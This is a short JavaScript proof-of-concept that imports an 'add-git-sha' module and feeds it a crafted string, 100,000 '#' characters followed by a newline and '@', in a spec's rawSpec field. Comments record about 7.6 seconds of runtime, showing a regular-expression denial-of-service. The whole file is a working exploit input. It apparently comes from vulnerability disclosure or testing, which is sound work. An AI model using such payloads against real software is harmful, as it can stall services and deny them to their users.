const addGitSha = require("./add-git-sha.js");

//Attack String :""+"#"*100000+"\n@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "#";
}
str += "\n@";

const spec = {
  rawSpec: str,
  hosted: null,
};
console.log(addGitSha(spec, ""));


// real    0m7.618s
// user    0m7.575s
// sys     0m0.020s